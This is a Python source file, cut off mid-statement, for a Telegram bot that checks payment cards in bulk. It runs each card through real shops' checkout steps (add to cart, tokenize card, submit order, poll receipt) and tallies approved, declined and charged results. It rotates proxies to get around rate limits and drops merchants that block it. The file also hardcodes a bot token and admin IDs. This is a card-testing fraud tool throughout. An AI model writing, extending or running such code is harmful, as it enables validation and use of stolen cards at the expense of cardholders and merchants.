import os
import io
import time
import random
import asyncio
import logging
from datetime import datetime

from concurrent.futures import ThreadPoolExecutor, as_completed

from typing import List, Dict, Tuple, Optional
import threading

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.error import RetryAfter
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    CallbackQueryHandler,
    filters,
)

import neww as checkout

import t2

BOT_TOKEN = "8397130185:AAE4X458pa6FQWIR_MvA_N7FJJ0ztd7N02k"

GLOBAL_MAX_WORKERS = 60
BATCH_WORKERS = 20
BROADCAST_WORKERS = 20

UPLOADS_DIR = "uploads"

BOT_PRODUCT_CACHE: Dict[str, Tuple[str, str, str, str]] = {}
BOT_PRODUCT_CACHE_LOCK = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("tg-bot")

def _parse_admin_ids_env() -> set:
    raw = os.getenv("BOT_ADMINS", "").strip()
    if not raw:
        return set()
    ids = set()
    for tok in raw.replace(";", ",").replace(" ", ",").split(","):
        tok = tok.strip()
        if tok.isdigit():
            try:
                ids.add(int(tok))
            except Exception:
                pass
    return ids

ADMIN_IDS = _parse_admin_ids_env()
try:
    ADMIN_IDS.add(6307224822)
    ADMIN_IDS.add(6028572049)
    ADMIN_IDS.add(5646492454)
    ADMIN_IDS.add(6224953439)
    ADMIN_IDS.add(5733576801)
    ADMIN_IDS.add(7053462748)
    ADMIN_IDS.add(-1002798580895)
except Exception:
    ADMIN_IDS = set([6307224822])
STATS_FILE = "user_stats.json"
STATS_LOCK = threading.Lock()
APPROVED_FILE_LOCK = threading.Lock()
ACTIVE_BATCHES: Dict[str, Dict] = {}
ACTIVE_LOCK = asyncio.Lock()

PENDING_FILE = "pending_batches.json"
PENDING_LOCK = threading.Lock()

def _load_pending() -> Dict[str, Dict]:
    try:
        import json
        if not os.path.exists(PENDING_FILE):
            return {}
        with open(PENDING_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except Exception:
        return {}

def _save_pending(pending: Dict[str, Dict]) -> None:
    try:
        import json
        tmp = PENDING_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(pending, f, indent=2, ensure_ascii=False)
        os.replace(tmp, PENDING_FILE)
    except Exception:
        pass

async def add_pending(batch_id: str, payload: Dict) -> None:
    with PENDING_LOCK:
        data = _load_pending()
        try:
            current = data.get(str(batch_id), {})
            if "processed" in current:
                payload["processed"] = current["processed"]
            data[str(batch_id)] = payload or {}
        except Exception:
            data[str(batch_id)] = {}
        _save_pending(data)

async def remove_pending(batch_id: str) -> None:
    with PENDING_LOCK:
        data = _load_pending()
        try:
            data.pop(str(batch_id), None)
        except Exception:
            pass
        _save_pending(data)

async def list_pending() -> Dict[str, Dict]:
    async with PENDING_LOCK:
        return _load_pending()

class RestartChatProxy:
    def __init__(self, bot, chat_id: int):
        self._bot = bot
        self.id = chat_id
    async def send_message(self, text: str, parse_mode=None, disable_web_page_preview=True, reply_markup=None):
        return await self._bot.send_message(chat_id=self.id, text=text, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview, reply_markup=reply_markup)

class RestartUserProxy:
    def __init__(self, user_id: int, name: str, username: Optional[str] = None):
        self.id = user_id
        self.full_name = name or str(user_id)
        self.username = username or None

class RestartUpdate:
    def __init__(self, chat_proxy: RestartChatProxy, user_proxy: RestartUserProxy):
        self.effective_chat = chat_proxy
        self.effective_user = user_proxy
        self.callback_query = None
        self.message = None

class RestartContext:
    def __init__(self, bot, application):
        self.bot = bot
        self.application = application
        self.chat_data = {}

async def resume_pending_batches(app):
    try:
        pend = await list_pending()
    except Exception:
        pend = {}
    if not isinstance(pend, dict) or not pend:
        return
    bot = app.bot
    for batch_id, payload in pend.items():
        try:
            chat_id = int(payload.get("chat_id"))
            user_id = int(payload.get("user_id"))
            title = payload.get("title") or "Batch"
            cards = payload.get("cards") or []
            sites = payload.get("sites") or []
            send_approved = bool(payload.get("send_approved_notifications", True))
            if not isinstance(cards, list) or not isinstance(sites, list) or not chat_id or not user_id:
                continue
            try:
                s = await get_user_stats(user_id)
                display_name = (s.get("name") or str(user_id)).strip()
            except Exception:
                display_name = str(user_id)
            chat_proxy = RestartChatProxy(bot, chat_id)
            user_proxy = RestartUserProxy(user_id, display_name)
            update_like = RestartUpdate(chat_proxy, user_proxy)
            context_like = RestartContext(bot, app)
            cancel_event = asyncio.Event()
            
            processed = 0
            try:
                processed = int(payload.get("processed", 0))
                if processed > 0 and isinstance(cards, list):
                    cards = cards[processed:]
            except Exception:
                processed = 0
                
            proxy_mapping = None
            try:
                plist = await get_user_proxies(user_id)
                if isinstance(plist, list) and len(plist) > 0:
                    proxy_mapping = list(plist)
            except Exception:
                proxy_mapping = None
            resumed_batch_id = str(batch_id)
            try:
                chosen_executor = GLOBAL_EXECUTOR if (isinstance(cards, list) and len(cards) > SMALL_BATCH_THRESHOLD) else SMALL_TASK_EXECUTOR
            except Exception:
                chosen_executor = GLOBAL_EXECUTOR
            runner = BatchRunner(cards, sites, chosen_executor, resumed_batch_id, chat_id, user_id, cancel_event, 
                            send_approved_notifications=send_approved, proxies_override=proxy_mapping, start_from=processed)
            app.create_task(runner.run_with_notifications(update_like, context_like, title=title))
        except Exception as e:
            try:
                logger.warning(f"Failed to resume batch {batch_id}: {e}")
            except Exception:
                pass

async def _post_init(app):
    try:
        await resume_pending_batches(app)
    except Exception as e:
        try:
            logger.warning(f"resume_pending_batches failed in post_init: {e}")
        except Exception:
            pass

ACCESS_FILE = "access_policy.json"
ACCESS_LOCK = threading.Lock()

REQUIRED_CHANNELS = []
CHANNEL_MEMBERSHIP_CACHE: Dict[int, Dict[str, bool]] = {}
CHANNEL_CACHE_LOCK = threading.Lock()
CHANNEL_CACHE_DURATION = 300




def _load_stats() -> Dict:
    try:
        if not os.path.exists(STATS_FILE):
            return {}
        with open(STATS_FILE, "r", encoding="utf-8") as f:
            import json
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except Exception:
        return {}

def _save_stats(stats: Dict) -> None:
    try:
        import json
        tmp = STATS_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
        os.replace(tmp, STATS_FILE)
    except Exception:
        pass

def is_admin(user_id: int) -> bool:
    return (not ADMIN_IDS) or (user_id in ADMIN_IDS)


async def has_permission(user_id: int, command_name: str) -> bool:
    try:
        if is_admin(user_id):
            return True
    except Exception:
        return False
    try:
        p = await get_access_policy()
        perms = p.get("perms") or {}
        key_str = str(int(user_id)) if isinstance(user_id, (int, str)) and str(user_id).isdigit() else str(user_id)
        user_perms = []
        if isinstance(perms, dict):
            user_perms = perms.get(key_str) or perms.get(str(user_id)) or []
        norm_cmd = (command_name or "").lstrip("/").lower()
        try:
            user_perms = [str(x).lstrip("/").lower() for x in (user_perms or [])]
        except Exception:
            user_perms = []
        return norm_cmd in user_perms
    except Exception:
        return False

async def inc_user_stats(user_id: int, name: str, username: str = None, tested: int = 0, approved: int = 0, charged: int = 0, chat_id: Optional[int] = None):
    with STATS_LOCK:
        stats = _load_stats()
        key = str(user_id)
        u = stats.get(key) if isinstance(stats, dict) else None
        if not isinstance(u, dict):
            u = {"name": name, "username": username, "tested": 0, "approved": 0, "charged": 0}
        u["name"] = name or u.get("name") or str(user_id)
        if username:
            u["username"] = username
        try:
            if chat_id is not None:
                u["last_chat_id"] = int(chat_id)
        except Exception:
            pass
        try:
            u["tested"] = int(u.get("tested", 0)) + int(tested)
            u["approved"] = int(u.get("approved", 0)) + int(approved)
            u["charged"] = int(u.get("charged", 0)) + int(charged)
        except Exception:
            u["tested"] = (u.get("tested") or 0) + tested
            u["approved"] = (u.get("approved") or 0) + approved
            u["charged"] = (u.get("charged") or 0) + charged
        stats[key] = u
        _save_stats(stats)

async def get_user_stats(user_id: int) -> Dict:
    with STATS_LOCK:
        stats = _load_stats()
        u = stats.get(str(user_id), {})
        return {
            "name": u.get("name") or str(user_id),
            "username": u.get("username"),
            "tested": int(u.get("tested", 0) or 0),
            "approved": int(u.get("approved", 0) or 0),
            "charged": int(u.get("charged", 0) or 0),
            "last_chat_id": u.get("last_chat_id"),
        }

async def get_all_stats() -> Dict[str, Dict]:
    with STATS_LOCK:
        return _load_stats()

PROXIES_FILE = "ng/user_proxies.txt"
PROXIES_LOCK = threading.Lock()

def _read_proxy_records() -> List[Tuple[str, str, str, str, int]]:
    records: List[Tuple[str, str, str, str, int]] = []
    try:
        if not os.path.exists(PROXIES_FILE):
            return records
        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                s = (ln or "").strip()
                if not s:
                    continue
                parts = s.split("|")
                if len(parts) < 4:
                    continue
                user_id_str = parts[0].strip()
                name = parts[1].strip()
                username = parts[2].strip()
                proxy = parts[3].strip()
                try:
                    ts = int(parts[4]) if len(parts) >= 5 and str(parts[4]).strip().isdigit() else int(time.time())
                except Exception:
                    ts = int(time.time())
                if user_id_str and proxy:
                    records.append((user_id_str, name, username, proxy, ts))
    except Exception:
        pass
    return records

def _write_proxy_records(records: List[Tuple[str, str, str, str, int]]) -> None:
    try:
        os.makedirs(os.path.dirname(PROXIES_FILE), exist_ok=True)
    except Exception:
        pass
    try:
        tmp = PROXIES_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            for (uid, name, username, proxy, ts) in records:
                uname = username if (isinstance(username, str)) else ""
                f.write(f"{uid}|{name}|{uname}|{proxy}|{ts}\n")
        os.replace(tmp, PROXIES_FILE)
    except Exception:
        pass

async def add_user_proxy(user_id: int, name: str, username: Optional[str], proxy_url: str) -> None:
    uid = str(int(user_id))
    proxy = (proxy_url or "").strip()
    if not proxy:
        return
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, _n, _un, p, _t) in recs:
            if u == uid and p.strip() == proxy:
                return
        display_name = (name or uid).strip()
        uname = (username or "") if username else ""
        recs.append((uid, display_name, uname, proxy, int(time.time())))
        _write_proxy_records(recs)

async def get_user_proxies(user_id: int) -> List[str]:
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        out: List[str] = []
        seen = set()
        for (u, _n, _un, p, _t) in recs:
            if u == uid:
                if p not in seen:
                    seen.add(p)
                    out.append(p)
        return out

async def get_user_proxy(user_id: int) -> Optional[str]:
    proxies = await get_user_proxies(user_id)
    return proxies[0] if proxies else None

async def clear_user_proxy(user_id: int) -> None:
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        recs = [(u, n, un, p, t) for (u, n, un, p, t) in recs if u != uid]
        _write_proxy_records(recs)

async def remove_user_proxy(user_id: int, proxy_url: str) -> None:
    uid = str(int(user_id))
    target = (proxy_url or "").strip()
    if not target:
        return
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        recs = [(u, n, un, p, t) for (u, n, un, p, t) in recs if not (u == uid and p.strip() == target)]
        _write_proxy_records(recs)

async def get_user_info_for_proxy(user_id: int) -> tuple:
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, n, un, p, t) in recs:
            if u == uid:
                return (n or str(user_id), un or "")
        return (str(user_id), "")

def normalize_proxy_url(p: Optional[str]) -> Optional[str]:
    try:
        if not p:
            return None
        s = p.strip()
        if not s or s.startswith("#"):
            return None
        lower = s.lower()
        if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
            return s
        parts = s.split(":")
        if len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
            pwd = parts[-1]
            try:
                from urllib.parse import quote as _q
            except Exception:
                def _q(x, safe=""):
                    return x
            user_enc = _q(user, safe="")
            pwd_enc = _q(pwd, safe="")
            return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
        return f"http://{s}"
    except Exception:
        return None

def _load_access() -> Dict:
    try:
        import json
        if not os.path.exists(ACCESS_FILE):
            return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False, "perms": {}, "admin_ids": []}
        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, dict):
                return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False}
            ra = bool(data.get("restrict_all", False))
            allow = data.get("allow_only_ids", []) or []
            block = data.get("blocked_ids", []) or []
            allowed_groups = data.get("allowed_groups", []) or []
            groups_only = bool(data.get("groups_only", False))
            try:
                allow = [int(x) for x in allow if str(x).strip()]
            except Exception:
                allow = []
            try:
                block = [int(x) for x in block if str(x).strip()]
            except Exception:
                block = []
            try:
                allowed_groups = [int(x) for x in allowed_groups if str(x).strip()]
            except Exception:
                allowed_groups = []
            admin_ids = data.get("admin_ids", []) or []
            perms = data.get("perms", {}) or {}
            try:
                admin_ids = [int(x) for x in admin_ids if str(x).strip()]
            except Exception:
                admin_ids = []
            return {"restrict_all": ra, "allow_only_ids": allow, "blocked_ids": block, "allowed_groups": allowed_groups, "groups_only": groups_only, "perms": perms, "admin_ids": admin_ids}
    except Exception:
        return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False, "perms": {}, "admin_ids": []}

def _save_access(policy: Dict) -> None:
    try:
        import json
        tmp = ACCESS_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(policy, f, indent=2, ensure_ascii=False)
        os.replace(tmp, ACCESS_FILE)
    except Exception:
        pass

async def get_access_policy() -> Dict:
    with ACCESS_LOCK:
        return _load_access()

async def set_access_policy(policy: Dict) -> None:
    with ACCESS_LOCK:
        base = {
            "restrict_all": False, 
            "allow_only_ids": [], 
            "blocked_ids": [], 
            "allowed_groups": [], 
            "groups_only": False,
            "bypass_groups_only": [],
            "perms": {}, 
            "admin_ids": []
        }
        try:
            base.update(policy or {})
        except Exception:
            pass
        _save_access(base)

async def is_user_allowed(user_id: int, chat_id: int, chat_type: Optional[str] = None, check_groups_only: bool = True) -> bool:
    try:
        if is_admin(user_id):
            return True
    except Exception:
        return False
    p = await get_access_policy()
    allow_only = p.get("allow_only_ids") or []
    restrict_all = bool(p.get("restrict_all", False))
    blocked = p.get("blocked_ids") or []
    allowed_groups = p.get("allowed_groups") or []
    groups_only = bool(p.get("groups_only", False)) and check_groups_only
    try:
        if allow_only:
            return (user_id in allow_only) or (chat_id in allow_only)

        if groups_only:
            if chat_type and str(chat_type).lower() == 'private':
                bypass_users = p.get("bypass_groups_only", []) or []
                if user_id not in bypass_users:
                    return False
            if allowed_groups:
                try:
                    if int(chat_id) not in allowed_groups:
                        return False
                except Exception:
                    return False

        if restrict_all:
            return False
        if user_id in blocked:
            return False
        return True
    except Exception:
        return False

async def check_channel_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> Tuple[bool, List[str]]:
    return True, []

async def ensure_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        chat_type = getattr(update.effective_chat, "type", None)
        
        msg_text = (update.message.text or "").strip().lower() if update.message else ""
        if msg_text.startswith("/setpr"):
            return await is_user_allowed(user_id, chat_id, chat_type, check_groups_only=False)
            
        allowed = await is_user_allowed(user_id, chat_id, chat_type)
        if not allowed:
            await update.message.reply_text("Access restricted.")
            return False
            
        return True
    except Exception:
        try:
            await update.effective_chat.send_message("Access restricted.")
        except Exception:
            pass
        return False

def mask_proxy_password(proxy_url: str) -> str:
    try:
        if not proxy_url or ":" not in proxy_url:
            return proxy_url
        
        if "//" in proxy_url:
            if "@" in proxy_url:
                prefix, rest = proxy_url.rsplit("@", 1)
                if ":" in prefix:
                    parts = prefix.split(":")
                    if len(parts) >= 2:
                        return f"{':'.join(parts[:-1])}:****@{rest}"
            return proxy_url
            
        parts = proxy_url.split(":")
        if len(parts) >= 4:
            return f"{':'.join(parts[:-1])}:****"
            
        return proxy_url
    except Exception:
        return proxy_url

async def get_user_proxy_info(user_id: int) -> Optional[Tuple[str, str, str]]:
    uid = str(int(user_id))
    async with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, name, username, proxy, _) in recs:
            if u == uid:
                return (proxy, name, username)
    return None

def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[Dict[str, str]] = None, runner=None) -> Tuple[str, str, str, str, Optional[str], Optional[str]]:
    last_exception_msg: Optional[str] = None
    try:
        card_data = {**checkout.CARD_DATA, **card}
    except Exception:
        card_data = card

    try:
        checkout.init_proxies()
    except Exception:
        pass

    global BOT_PRODUCT_CACHE, BOT_PRODUCT_CACHE_LOCK
    site_product_cache = BOT_PRODUCT_CACHE
    filtered_sites = []
    if isinstance(sites, list):
        for site in sites:
            try:
                if "robalostore" not in site.lower():
                    filtered_sites.append(site)
            except Exception:
                filtered_sites.append(site)
    else:
        filtered_sites = list(sites) if sites else []
    
    try:
        pan_digits = "".join([c for c in str(card_data.get("number", "")) if c.isdigit()])
    except Exception:
        pan_digits = ""
    total_sites = len(filtered_sites) if isinstance(filtered_sites, list) else 0
    if total_sites > 0:
        try:
            offset = int(pan_digits[-2:]) % total_sites if pan_digits else random.randint(0, total_sites - 1)
        except Exception:
            offset = 0
        ordered_sites = filtered_sites[offset:] + filtered_sites[:offset]
    else:
        ordered_sites = list(filtered_sites) if isinstance(filtered_sites, list) else []
    
    used_proxy_url = None
    if isinstance(proxies_override, dict) and proxies_override:
        used_proxy_url = proxies_override.get('https') or proxies_override.get('http')
    
    for site in ordered_sites:
        try:
            shop_url = checkout.normalize_shop_url(site)
            site_label = format_site_label(shop_url)
            if isinstance(proxies_override, dict) and proxies_override:
                proxies_mapping = proxies_override
            else:
                proxies_mapping, used_proxy_url = checkout.get_next_proxy_mapping()
            session = checkout.create_session(shop_url, proxies=proxies_mapping)

            with BOT_PRODUCT_CACHE_LOCK:
                cached = site_product_cache.get(shop_url)
            if cached:
                product_id, variant_id, price, title = cached
            else:
                product_id, variant_id, price, title = checkout.auto_detect_cheapest_product(session, shop_url)
                if variant_id:
                    with BOT_PRODUCT_CACHE_LOCK:
                        site_product_cache[shop_url] = (product_id, variant_id, price, title)
            if not variant_id:
                continue

            _429_retry_count = 0
            while True:
                checkout_token, session_token, cookies = checkout.step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=_429_retry_count)
                
                if checkout_token == "429_ROTATE":
                    _429_retry_count = int(session_token or "0") + 1
                    if _429_retry_count < 2:
                        if runner and runner.proxies_list:
                            try:
                                if len(runner.proxies_list) > 0:
                                    with runner._proxy_idx_lock:
                                        runner._proxy_idx = (runner._proxy_idx + 1) % len(runner.proxies_list)
                                        new_proxy = runner.proxies_list[runner._proxy_idx]
                                        session.proxies.update({"http": new_proxy, "https": new_proxy})
                            except Exception:
                                pass
                        continue
                    else:
                        checkout_token = None
                        session_token = None
                        break
                
                break
                
            if not checkout_token or not session_token:
                continue

            card_session_id = checkout.step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data)
            if not card_session_id:
                continue

            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, payment_identifier, phone_required, proposed_tax, merchandise_prices = checkout.step3_proposal_ctx(
                session, checkout_token, session_token, card_session_id, shop_url, variant_id
            )
            if not queue_token or not shipping_handle:
                continue

            receipt_result = checkout.step4_submit_completion_ctx(
                session, checkout_token, session_token, queue_token,
                shipping_handle, merchandise_id, card_session_id,
                actual_total, delivery_expectations, payment_identifier, shop_url, variant_id, phone_required,
                proposed_tax=proposed_tax, merchandise_prices=merchandise_prices
            )

            def _amount_display():
                try:
                    return checkout.format_amount(actual_total)
                except Exception:
                    return "$0"

            if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 4:
                    receipt_id, submit_code, submit_message, submit_resp = receipt_result
                else:
                    receipt_id, submit_code, submit_message = receipt_result
                    submit_resp = {}
            else:
                receipt_id = receipt_result
                submit_code = "UNKNOWN"
                submit_message = None
                submit_resp = {}

            if not receipt_id:
                submit_upper = (str(submit_code) if submit_code is not None else "").upper()
                site_level_submit_errors = (
                    "MERCHANDISE_OUT_OF_STOCK",
                    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
                    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
                    "REQUIRED_ARTIFACTS_UNAVAILABLE",
                    "CAPTCHA_METADATA_MISSING",
                    "PAYMENTS_METHOD",
                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                )
                if any(tok in submit_upper for tok in site_level_submit_errors):
                    try:
                        with BOT_PRODUCT_CACHE_LOCK:
                            if shop_url in site_product_cache:
                                del site_product_cache[shop_url]
                    except Exception:
                        pass
                    try:
                        checkout.remove_site_from_working_sites(shop_url)
                    except Exception:
                        pass
                    try:
                        normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                        sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                    except Exception:
                        pass
                    continue
                try:
                    code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "UNKNOWN"'
                except Exception:
                    code_display = '"code": "UNKNOWN"'
                status = classify_prefix(code_display)
                if status == "unknown":
                    continue
                return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url

            success, poll_response, poll_log = checkout.step5_poll_receipt_ctx(
                session, checkout_token, session_token, receipt_id, shop_url, capture_log=False
            )
            try:
                code_display = checkout.extract_receipt_code(poll_response)
            except Exception:
                code_display = '"code": "UNKNOWN"'
            status = classify_prefix(code_display)
            if status == "unknown":
                try:
                    receipt = (poll_response or {}).get("data", {}).get("receipt", {}) if isinstance(poll_response, dict) else {}
                    if isinstance(receipt, dict) and receipt.get("__typename") == "FailedReceipt":
                        perr = receipt.get("processingError", {}) or {}
                        ptyp = perr.get("__typename", "")
                        if ptyp in ("InventoryReservationFailure", "InventoryClaimFailure", "OrderCreationFailure"):
                            try:
                                with BOT_PRODUCT_CACHE_LOCK:
                                    if shop_url in site_product_cache:
                                        del site_product_cache[shop_url]
                            except Exception:
                                pass
                            continue
                except Exception:
                    pass
                continue
            try:
                code_upper = (code_display or "").upper()
                if ("PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in code_upper) or ("PAYMENTS_METHOD" in code_upper) or ("DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in code_upper):
                    try:
                        with BOT_PRODUCT_CACHE_LOCK:
                            if shop_url in site_product_cache:
                                del site_product_cache[shop_url]
                    except Exception:
                        pass
                    try:
                        checkout.remove_site_from_working_sites(shop_url)
                    except Exception:
                        pass
                    try:
                        normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                        sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                    except Exception:
                        pass
                    continue
            except Exception:
                pass
            return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url

        except Exception as e:
            try:
                last_exception_msg = str(e)
            except Exception:
                last_exception_msg = repr(e)
            logger.warning(f"Site attempt failed due to exception: {e}")
            continue

    if last_exception_msg:
        single = " ".join(str(last_exception_msg).splitlines())
        code_msg = f'"code": "{single}"'
    else:
        code_msg = '"code": "UNKNOWN"'
    return "unknown", code_msg, "$0", "", used_proxy_url, None


class BatchRunner:
    def __init__(self, cards: List[Dict], sites: List[str], executor: ThreadPoolExecutor, batch_id: str, chat_id: int, user_id: int, cancel_event: asyncio.Event, send_approved_notifications: bool = True, proxies_override: Optional[Dict[str, str]] = None, start_from: int = 0):
        self.cards = cards
        self.sites = sites
        self.executor = executor
        self.total = len(cards)
        self.processed = start_from
        self.approved = 0
        self.declined = 0
        self.charged = 0
        self.start_ts = time.time()
        self.lock = asyncio.Lock()
        self.batch_id = batch_id
        self.chat_id = chat_id
        self.user_id = user_id
        self.cancel_event = cancel_event
        self.send_approved_notifications = bool(send_approved_notifications)
        self.proxies_mapping: Optional[Dict[str, str]] = None
        self.proxies_list: Optional[List[str]] = None
        if isinstance(proxies_override, list):
            try:
                self.proxies_list = [str(p).strip() for p in proxies_override if str(p).strip()]
            except Exception:
                self.proxies_list = None
        elif isinstance(proxies_override, dict):
            self.proxies_mapping = proxies_override
        else:
            self.proxies_mapping = None
        self._proxy_idx_lock = threading.Lock()
        self._proxy_idx = 0
        self.per_proxy_unknown: Dict[str, int] = {}
        self.unknown_streak = 0
        self.proxy_dead_notified = False

    def stop_keyboard(self):
        try:
            if self.cancel_event and not self.cancel_event.is_set():
                return InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{self.batch_id}")]]
                )
        except Exception:
            pass
        return None

    async def run(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
        progress_msg = await update.effective_chat.send_message(
            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=self.stop_keyboard(),
        )

        futures = []
        for card in self.cards:
            futures.append(self.executor.submit(check_single_card, card, self.sites, None, self))

        for fut in as_completed(futures):
            result = fut.result()
            if len(result) == 6:
                status, code_display, amount_display, site_label, used_proxy_url, site_url = result
            elif len(result) == 5:
                status, code_display, amount_display, site_label, used_proxy_url = result
                site_url = None
            elif len(result) == 4:
                status, code_display, amount_display, site_label = result
                used_proxy_url = None
                site_url = None
            else:
                status, code_display, amount_display, site_label = "unknown", '"code": "UNKNOWN"', "$0", ""
                used_proxy_url = None
                site_url = None
            
            async with self.lock:
                self.processed += 1
                if status == "charged":
                    self.charged += 1
                elif status == "approved":
                    self.approved += 1
                elif status == "declined":
                    self.declined += 1
                else:
                    self.declined += 1
                try:
                    await context.bot.edit_message_text(
                        chat_id=progress_msg.chat_id,
                        message_id=progress_msg.message_id,
                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                except Exception:
                    pass

            if status in ("approved", "charged") and self.send_approved_notifications:
                try:
                    notify_text = result_notify_text(card, status, code_display, amount_display, site_label)
                    await update.effective_chat.send_message(
                        text=notify_text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                except Exception:
                    pass

        await update.effective_chat.send_message(
            text=f"Completed: {self.processed}/{self.total}\n"
                 f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    async def run_with_notifications(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
        try:
            progress_msg = await update.effective_chat.send_message(
                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=self.stop_keyboard(),
            )
        except Exception as e:
            try:
                if isinstance(e, RetryAfter):
                    retry_after = e.retry_after
                    logger.warning(f"Flood control hit on initial message, waiting {retry_after} seconds")
                    await asyncio.sleep(retry_after)
                    progress_msg = await update.effective_chat.send_message(
                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                        reply_markup=self.stop_keyboard(),
                    )
                else:
                    logger.error(f"Error sending initial progress message: {e}")
                    class DummyMsg:
                        def __init__(self):
                            self.chat_id = update.effective_chat.id
                            self.message_id = 0
                    progress_msg = DummyMsg()
            except Exception:
                logger.error(f"Failed to send initial progress message after retry: {e}")
                class DummyMsg:
                    def __init__(self):
                        self.chat_id = update.effective_chat.id
                        self.message_id = 0
                progress_msg = DummyMsg()

        sites_to_remove = set()

        sem = asyncio.Semaphore(BATCH_WORKERS)

        async def run_one(card: Dict):
            async with sem:
                selected_proxy_url: Optional[str] = None
                mapping_to_use: Optional[Dict[str, str]] = None
                try:
                    if self.proxies_list:
                        with self._proxy_idx_lock:
                            if not self.proxies_list:
                                mapping_to_use = None
                            else:
                                idx = self._proxy_idx % len(self.proxies_list)
                                self._proxy_idx += 1
                                selected_proxy_url = self.proxies_list[idx]
                                mapping_to_use = {"http": selected_proxy_url, "https": selected_proxy_url}
                    elif self.proxies_mapping:
                        mapping_to_use = self.proxies_mapping
                        try:
                            selected_proxy_url = self.proxies_mapping.get("https") or self.proxies_mapping.get("http")
                        except Exception:
                            selected_proxy_url = None
                except Exception:
                    mapping_to_use = self.proxies_mapping
                try:
                    loop = asyncio.get_running_loop()
                    result = await loop.run_in_executor(self.executor, check_single_card, card, self.sites, mapping_to_use)
                    if len(result) == 6:
                        status, code_display, amount_display, site_label, used_proxy_url, site_url = result
                    elif len(result) == 5:
                        status, code_display, amount_display, site_label, used_proxy_url = result
                        site_url = None
                    elif len(result) == 4:
                        status, code_display, amount_display, site_label = result
                        used_proxy_url = selected_proxy_url
                        site_url = None
                    else:
                        status, code_display, amount_display, site_label = "unknown", '"code": "UNKNOWN"', "$0", ""
                        used_proxy_url = selected_proxy_url
                        site_url = None
                    return card, status, code_display, amount_display, site_label, used_proxy_url, site_url
                except Exception as e:
                    try:
                        logger.warning(f"Batch task failed: {e}")
                    except Exception:
                        pass
                    return card, "unknown", '"code": "UNKNOWN"', "$0", "", selected_proxy_url, None

        tasks = [asyncio.create_task(run_one(card)) for card in self.cards]

        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES[self.batch_id] = {
                    "event": self.cancel_event,
                    "tasks": tasks,
                    "chat_id": self.chat_id,
                    "user_id": self.user_id,
                    "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(self.user_id)),
                    "user_username": getattr(update.effective_user, "username", None),
